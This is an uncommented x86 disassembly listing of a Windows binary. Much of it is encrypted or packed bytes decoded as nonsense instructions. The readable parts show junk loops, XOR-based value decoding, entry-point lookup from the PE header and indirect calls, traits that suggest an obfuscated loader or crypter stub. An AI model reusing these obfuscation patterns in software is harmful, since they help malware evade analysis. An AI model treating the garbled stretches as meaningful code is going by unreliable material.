  4061a1:	sbb    BYTE PTR [esi-0x59],ah
  4061a4:	in     al,0x6b
  4061a6:	sub    BYTE PTR [edi],ch
  4061a8:	inc    ebp
  4061a9:	daa    
  4061aa:	jb     0x4061b0
  4061ac:	mov    WORD PTR [eax+0x88379b],?
  4061b2:	fadd   st(4),st
  4061b4:	ja     0x406216
  4061b6:	and    al,0x38
  4061b9:	push   esi
  4061ba:	repnz push 0x8ade4598
  4061c0:	mov    ds:0x89ae7fdf,al
  4061c5:	or     al,0xf8
  4061c7:	outs   dx,DWORD PTR ds:[esi]
  4061c8:	lahf   
  4061c9:	jecxz  0x406241
  4061cb:	pop    ecx
  4061cc:	push   edi
  4061cd:	cli    
  4061ce:	pop    edx
  4061cf:	add    cl,al
  4061d1:	std    
  4061d2:	inc    esp
  4061d3:	sahf   
  4061d4:	and    al,0x7
  4061d6:	pusha  
  4061d7:	xchg   edi,eax
  4061d8:	hlt    
  4061d9:	xchg   DWORD PTR [eax],ebp
  4061db:	gs add eax,0x3ec56191
  4061e1:	mov    ecx,0x4065603d
  4061e6:	sbb    eax,0x3cd67070
  4061eb:	pushf  
  4061ec:	xchg   ecx,eax
  4061ed:	mov    ecx,0x6bab07fc
  4061f2:	retf   
  4061f3:	dec    ebx
  4061f4:	pop    ss
  4061f5:	mov    ch,0x47
  4061f7:	push   ebx
  4061f8:	inc    ebp
  4061f9:	sub    ch,BYTE PTR [edi]
  4061fb:	leave  
  4061fc:	jp     0x406215
  4061fe:	adc    ebp,DWORD PTR [eax+0x5dd751d2]
  406204:	in     al,dx
  406205:	mov    ?,WORD PTR [esi]
  406207:	outs   dx,BYTE PTR ds:[esi]
  406208:	shl    ch,cl
  40620a:	sbb    al,0xe0
  40620d:	arpl   WORD PTR [ecx-0x5f],bx
  406210:	mov    esp,0x2c4b1e8d
  406215:	test   eax,0x684f1047
  40621a:	loop   0x406236
  40621c:	mov    al,0x9f
  40621e:	adc    dl,BYTE PTR [esi]
  406220:	mov    esi,0xdbca1d4c
  406225:	mov    ecx,DWORD PTR [esi+esi*2]
  406228:	sbb    ebp,ebx
  40622a:	adc    DWORD PTR [esi-0x56],ebp
  40622d:	neg    esi
  40622f:	inc    esi
  406230:	mov    edi,DWORD PTR es:[edx+0x45]
  406234:	(bad)  
  406235:	dec    ecx
  406236:	mov    ecx,0xc6078c66
  40623b:	std    
  40623c:	retf   0xbc32
  40623f:	out    dx,eax
  406240:	inc    ecx
  406241:	scas   eax,DWORD PTR es:[edi]
  406242:	inc    ecx
  406243:	jno    0x4061f9
  406245:	dec    edi
  406246:	aas    
  406247:	or     al,0xb6
  406249:	pop    esi
  40624a:	loopne 0x4061f5
  40624c:	sub    ebp,eax
  40624e:	mov    eax,ds:0xb90bfd87
  406253:	lds    ebp,FWORD PTR [esi-0x41ef844f]
  406259:	dec    esi
  40625a:	pushf  
  40625b:	(bad)  
  40625c:	pop    edx
  40625d:	adc    BYTE PTR [eax+ebx*2],ah
  406260:	or     esp,eax
  406262:	outs   dx,DWORD PTR ds:[esi]
  406263:	pop    ebp
  406264:	xor    esi,eax
  406266:	and    DWORD PTR ds:0x433823,0x0
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x433823
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x433823,ecx
  406282:	cmp    DWORD PTR ds:0x433823,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x433823,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x433823,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x433823
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x433823,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	fs inc ecx
  406313:	ja     0x406344
  406315:	push   esp
  406316:	aas    
  406317:	jle    0x406397
  406319:	sub    al,0x7d
  40631b:	jle    0x40639b
  40631d:	xchg   ecx,eax
  40631e:	sub    DWORD PTR [ebp+0x1f],ebp
  406321:	jnp    0x40637c
  406323:	pop    es
  406324:	stos   DWORD PTR es:[edi],eax
  406325:	or     eax,edx
  406327:	int    0x51
  406329:	mov    esi,0x5037120e
  40632e:	sbb    eax,0x6359101d
  406333:	jmp    0x9095:0xc44154ca
  40633a:	rcr    DWORD PTR [ebp+ebp*1+0x6b],cl
  40633e:	fistp  QWORD PTR [esi+0x2bbdc47c]
  406344:	popa   
  406345:	mov    ch,0x92
  406347:	arpl   di,sp
  406349:	xor    DWORD PTR [edi*2-0x44283f25],esi
  406350:	lods   al,BYTE PTR ds:[esi]
  406351:	fist   DWORD PTR [edx-0x6178233a]
  406357:	or     BYTE PTR [ecx+0x301c1f6c],al
  40635d:	mov    eax,0xf144e6ec
  406362:	rol    edi,cl
  406364:	(bad)  ds:0x113bf4ac
  40636a:	daa    
  40636b:	adc    al,0x9b
  40636d:	out    0x7e,al
  40636f:	pop    ebp
  406370:	les    ecx,FWORD PTR [eax+0x4e]
  406373:	clc    
  406374:	(bad)  
  406375:	jmp    0xb17f095d
  40637a:	and    DWORD PTR [eax+0x1],edi
  40637d:	sub    BYTE PTR [ebx-0x614f4082],dh
  406383:	mov    bh,0xca
  406385:	in     eax,0xb
  406387:	jno    0x406359
  406389:	push   edx
  40638a:	sahf   
  40638b:	push   esp
  40638c:	mov    edi,0xca2bc472
  406391:	sub    al,0x8f
  406393:	cld    
  406394:	jp     0x4063ee
  406396:	gs clc 
  406398:	jmp    0xe144e8f
  40639d:	call   0x9816:0x58e7343a
  4063a4:	sbb    al,BYTE PTR [esi+0x6e]
  4063a7:	inc    ecx
  4063a8:	fxtract 
  4063aa:	and    al,0x54
  4063ac:	push   cs
  4063ad:	inc    ebp
  4063ae:	mov    bl,0x71
  4063b0:	mov    DWORD PTR [eax-0x57],ebp
  4063b3:	sar    BYTE PTR [eax+0x56],0x54
  4063b7:	dec    edi
  4063b8:	mov    dh,0xec
  4063ba:	daa    
  4063bb:	xor    BYTE PTR [ebp-0x2f],dh
  4063be:	jmp    0x4063a7
  4063c0:	ja     0x4063df
  4063c2:	clc    
  4063c3:	jecxz  0x4063ad
  4063c5:	mov    ds,eax
  4063c7:	shl    DWORD PTR [ebx],1
  4063c9:	outs   dx,DWORD PTR ds:[esi]
  4063ca:	call   DWORD PTR [edx+0x3f0c7907]
  4063d0:	pop    esi
  4063d1:	xlat   BYTE PTR ds:[ebx]
  4063d2:	dec    cx
  4063d4:	add    eax,0xbfb958fb
  4063d9:	sub    BYTE PTR [ebx+0x25277ccf],dl
  4063df:	pop    ss
  4063e0:	mov    BYTE PTR [ebp+0x72c0e76e],0x32
  4063e7:	clc    
  4063e8:	int3   
  4063e9:	adc    BYTE PTR [edx-0x1c58bcfe],cl
  4063ef:	lea    edi,[ebx-0x26236ad0]
  4063f5:	or     al,0xbb
  4063f7:	loop   0x40643a
  4063f9:	xchg   esi,eax
  4063fa:	arpl   WORD PTR [edx],cx
  4063fc:	into   
  4063fd:	mov    eax,0xb4be34a0
  406402:	repz pop ebp
  406404:	je     0x4063a6
  406406:	imul   cl
  406408:	adc    ah,BYTE PTR [esi-0x2da9a3fc]
  40640e:	out    dx,al
  40640f:	sbb    BYTE PTR [ecx+0x623a4986],ah
  406415:	push   ss
  406416:	sbb    DWORD PTR [ebx-0x41],edi
  406419:	adc    al,0xa
  40641b:	das    
  40641c:	xor    BYTE PTR [eax],cl
  40641e:	add    BYTE PTR [ebx+0x75],dl
  406421:	pop    edx
  406422:	fimul  DWORD PTR ds:0xb2d6aca3
  406428:	std    
  406429:	push   eax
  40642a:	jno    0x40641a
  40642c:	mov    ch,0x4f
  40642e:	das    
  40642f:	div    BYTE PTR [ebx+0x4f]
  406432:	in     eax,0xfa
  406434:	xor    DWORD PTR [ecx-0x4e],ebp
  406437:	scas   al,BYTE PTR es:[edi]
  406438:	stos   BYTE PTR es:[edi],al
  406439:	out    dx,al
  40643a:	xor    DWORD PTR [edi+ebp*1+0x60],0x77cf0100
  406442:	mov    ds:0x66e13d0e,eax
  406447:	dec    ebp
  406448:	fsubr  st,st(0)
  40644a:	outs   dx,BYTE PTR ds:[esi]
  40644b:	pop    ebp
  40644c:	dec    ecx
  40644d:	div    BYTE PTR [eax-0x4d5ecc27]
  406453:	(bad)  
  406454:	int3   
  406455:	mov    eax,ds:0x7a862bbb
  40645a:	sbb    DWORD PTR [ecx+ebp*1-0x1d7c879f],eax
  406461:	call   0xd4bd:0x25c3165a
  406468:	jnp    0x4063eb
  40646a:	nop
  40646b:	dec    esi
  40646c:	add    esp,edx
  40646e:	cmc    
  40646f:	aas    
  406470:	sub    edx,DWORD PTR [eax+ebx*4+0x5447d831]
  406477:	into   
  406478:	aam    0x50
  40647a:	inc    ebp
  40647b:	pop    es
  40647c:	add    BYTE PTR [ebp-0x80e44e7],bl
  406482:	adc    DWORD PTR [ebx+ebx*8],edi
  406485:	shr    DWORD PTR [ebx+0x3e961d49],1
  40648b:	lea    esp,[ecx+edi*8-0x54]
  40648f:	cmp    esp,DWORD PTR [esi+ebp*4+0x866d15d]
  406496:	pop    edx
  406497:	lods   al,BYTE PTR ds:[esi]
  406498:	pushf  
  406499:	stos   DWORD PTR es:[edi],eax
  40649a:	enter  0xe5ec,0x8a
  40649e:	out    dx,al
  40649f:	adc    dh,al
  4064a1:	add    al,0xf9
  4064a3:	out    dx,eax
  4064a4:	jae    0x4064f6
  4064a6:	pop    ebp
  4064a7:	inc    esp
  4064a8:	iret   
  4064a9:	push   ebx
  4064aa:	cmp    eax,0x130c47ea
  4064af:	lea    esp,fs:[eax]
  4064b2:	dec    ebp
  4064b3:	dec    esp
  4064b4:	push   ebx
  4064b5:	jecxz  0x4064e5
  4064b7:	dec    eax
  4064b8:	std    
  4064b9:	(bad)  
  4064ba:	push   0xdf2d4cc
  4064bf:	sbb    dh,BYTE PTR [edi]
  4064c1:	sub    BYTE PTR [esi+0x20],ah
  4064c4:	mov    bl,0x22
  4064c6:	fwait
  4064c7:	dec    ebp
  4064c8:	out    dx,al
  4064c9:	jns    0x406469
  4064cb:	ficom  WORD PTR [edx+0x7]
  4064ce:	outs   dx,BYTE PTR ds:[esi]
  4064cf:	bound  esi,QWORD PTR [ecx+0x7f8c0713]
  4064d5:	test   al,0x8a
  4064d7:	jbe    0x406512
  4064d9:	das    
  4064da:	pop    ebx
  4064db:	mov    dl,0x7a
  4064dd:	sbb    eax,0x34e57980
  4064e2:	mov    ebp,0x369e2f4c
  4064e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064e8:	xor    ebp,DWORD PTR [eax-0x40cbe4fc]
  4064ee:	inc    edx
  4064ef:	fs in  al,0x9e
  4064f2:	les    esp,FWORD PTR [edi+eiz*8]
  4064f5:	mov    al,0xb7
  4064f7:	aas    
  4064f8:	dec    edi
  4064f9:	push   ecx
  4064fa:	outs   dx,BYTE PTR ds:[esi]
  4064fb:	lods   eax,DWORD PTR ds:[esi]
  4064fc:	mov    eax,0x9be7a2d5
  406501:	lock push 0xdb3dc103
  406507:	jmp    FWORD PTR [eax-0x31]
  40650a:	nop
  40650b:	mov    bl,0x9e
  40650d:	jecxz  0x40653e
  40650f:	int3   
  406510:	mov    ds:0xb59d8be6,al
  406515:	mov    esp,0xbdc96e43
  40651a:	cli    
  40651b:	fwait
  40651c:	push   0x2d
  40651e:	pop    edx
  40651f:	inc    edx
  406520:	mov    ebx,0x269643
  406525:	ins    BYTE PTR es:[edi],dx
  406526:	sbb    edi,edx
  406528:	xor    edx,ebp
  40652a:	addr16 mov ebp,edi
  40652d:	call   0xad82:0xdba79c67
  406534:	xchg   ebp,eax
  406535:	data16 sub dh,dh
  406538:	(bad)  [edi-0x576fdfad]
  40653e:	fcomp  DWORD PTR [ecx-0x32e92118]
  406544:	mov    al,ds:0x5dfdf751
  406549:	loopne 0x40652b
  40654b:	push   esi
  40654c:	cmc    
  40654d:	jne    0x406522
  40654f:	pop    ebp
  406550:	call   edx
  406552:	lods   al,BYTE PTR ds:[esi]
  406553:	jge    0x4064f5
  406555:	dec    ebp
  406556:	mov    ch,0x0
  406558:	retf   0x96a0
  40655b:	cmp    DWORD PTR [ebx+ebp*8],ebx
  40655e:	psubsb mm4,QWORD PTR [eax+eax*8]
  406562:	jmp    0xaec1:0x31de92b9
  406569:	sub    BYTE PTR [edi+0x17],al
  40656c:	xor    DWORD PTR [edi],esp
  40656e:	ret    
  40656f:	xchg   edx,eax
  406571:	pop    edi
  406572:	push   ecx
  406573:	psubw  mm5,QWORD PTR [ebx]
  406576:	jp     0x40651a
  406578:	js     0x4065df
  40657a:	(bad)  
  40657b:	in     eax,dx
  40657c:	cmp    esi,esi
  40657e:	inc    esi
  40657f:	xor    DWORD PTR ds:0x7df09d05,edi
  406585:	mov    esi,edx
  406587:	dec    edi
  406588:	push   ecx
  406589:	pop    esp
  40658a:	mov    ch,BYTE PTR [edi+0x57bb6b16]
  406590:	cli    
  406591:	mov    ebp,0xba311c22
  406596:	ret    0x6d3b
  406599:	arpl   WORD PTR [edx+ebp*1+0xa52e37c],bx
  4065a0:	cli    
  4065a1:	fidivr WORD PTR [eiz*2-0x62b02b02]
  4065a8:	ins    BYTE PTR es:[edi],dx
  4065a9:	fstp   TBYTE PTR [ecx]
  4065ab:	pushf  
  4065ac:	jecxz  0x40653f
  4065ae:	pop    ss
  4065af:	and    eax,0x95fc6f1d
  4065b4:	out    dx,eax
  4065b5:	lods   eax,DWORD PTR ds:[esi]
  4065b6:	mov    al,cl
  4065b8:	out    dx,eax
  4065b9:	inc    edx
  4065ba:	stos   BYTE PTR es:[edi],al
  4065bb:	ss inc ebx
  4065bd:	ja     0x4065be
  4065bf:	call   0x27cb:0x9bb8f967
  4065c6:	pop    ebx
  4065c7:	dec    eax
  4065c8:	sub    bl,cl
  4065ca:	dec    esi
  4065cb:	aam    0x43
  4065cd:	inc    edx
  4065ce:	clc    
  4065cf:	jae    0x4065c4
  4065d1:	mov    ebp,0x94d0acc8
  4065d6:	ss inc edx
  4065d8:	ss scas eax,DWORD PTR es:[edi]
  4065da:	or     al,0x2f
  4065dc:	cmp    esi,esp
  4065de:	imul   ebp,DWORD PTR [edx+0x34e590ec],0x49f42865
  4065e8:	lods   al,BYTE PTR ds:[esi]
  4065e9:	fs and ebp,ebp
  4065ec:	mov    ds:0x75e91bcb,al
  4065f1:	das    
  4065f2:	sub    DWORD PTR [edi],ebx
  4065f4:	clc    
  4065f5:	ss and edx,ebp
  4065f8:	pop    esi
  4065f9:	or     al,0x7a
  4065fb:	jecxz  0x40659c
  4065fd:	popa   
  4065fe:	mov    ebp,DWORD PTR [ecx]
  406600:	pushf  
  406601:	popf   
  406602:	ss nop
  406604:	and    al,0xf1
  406606:	test   DWORD PTR [ecx-0x76],edi
  406609:	stos   DWORD PTR es:[edi],eax
  40660a:	shr    BYTE PTR [ecx+0x60],1
  40660d:	cli    
  40660e:	js     0x4065e9
  406610:	jbe    0x4065c7
  406612:	pop    ebx
  406613:	push   ebp
  406614:	cwde   
  406615:	inc    ebp
  406616:	mov    ebp,DWORD PTR [eax]
  406618:	jecxz  0x406640
  40661a:	jae    0x4065e4
  40661c:	fsubr  st(7),st
  40661e:	pop    ss
  40661f:	and    esi,eax
  406621:	and    BYTE PTR [edi+0x6c],dl
  406624:	ja     0x40667b
  406626:	jge    0x40667d
  406628:	xor    ebp,edi
  40662a:	and    DWORD PTR ds:0xa1083949,ebp
  406630:	aam    0xee
  406632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406633:	(bad)  
  406634:	js     0x4065c7
  406636:	jl     0x4065c1
  406638:	or     DWORD PTR [edi],ebx
  40663a:	test   BYTE PTR [ecx-0x14],bh
  40663d:	and    cl,ch
  40663f:	lods   al,BYTE PTR ds:[esi]
  406640:	ret    
  406641:	aas    
  406642:	inc    ecx
  406643:	pop    esi
  406644:	out    0xcb,eax
  406646:	(bad)  
  406647:	jnp    0x40660e
  406649:	mov    DWORD PTR [edx],ebp
  40664b:	ds pop ebp
  40664d:	sbb    al,0xff
  406650:	shr    cl,1
  406652:	add    eax,DWORD PTR [eax]
  406654:	add    BYTE PTR [eax],al
  406656:	mov    eax,DWORD PTR [ebp+0x10]
  406659:	leave  
  40665a:	ret    0xc
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x4336fb,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x4337d3,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x4337a7,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x4337e3,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x4337e3
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x4337e3,ecx
  4066d8:	cmp    DWORD PTR ds:0x4337e3,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433903
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x4337e3,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x4337e3
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x4337e3,ecx
  406714:	cmp    DWORD PTR ds:0x4337e3,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x4337d7
  406728:	and    ecx,DWORD PTR ds:0x43370f
  40672e:	mov    DWORD PTR ds:0x4337d7,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43371b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x43382b
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433713,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x43376b,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433707,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433707
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433707,ebx
  40677d:	cmp    DWORD PTR ds:0x433707,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433707,0x23
  406791:	jne    0x4067a7
  406797:	push   0x433933
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x4337ab,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433797,0x4337a7
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x4337d3
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x43376b,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433713,0x43379f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433707,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x4337af
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x4337e3
  40683c:	and    DWORD PTR ds:0x4337a7,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x43382b
  40684d:	or     DWORD PTR ds:0x4337e3,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x43375b,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43381f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x4337ab
  406870:	sub    DWORD PTR ds:0x4337d3,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43370b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433707,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433713,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43370f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x433723,0x43382b
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43379b,0x4337df
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x4337e7,0x433793
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x433753,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x43375b,0x4337ef
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x4337ab,0x43376f
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x43375b,0x43379b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x4336fb
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x4336fb,0x433723
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x4337db
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x4336ff,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x4337ef,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43381b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43381b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43381b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43381b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43381b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433797
  4069db:	adc    ecx,DWORD PTR ds:0x43375f
  4069e1:	mov    DWORD PTR ds:0x433797,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433793,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x433767,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433793,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
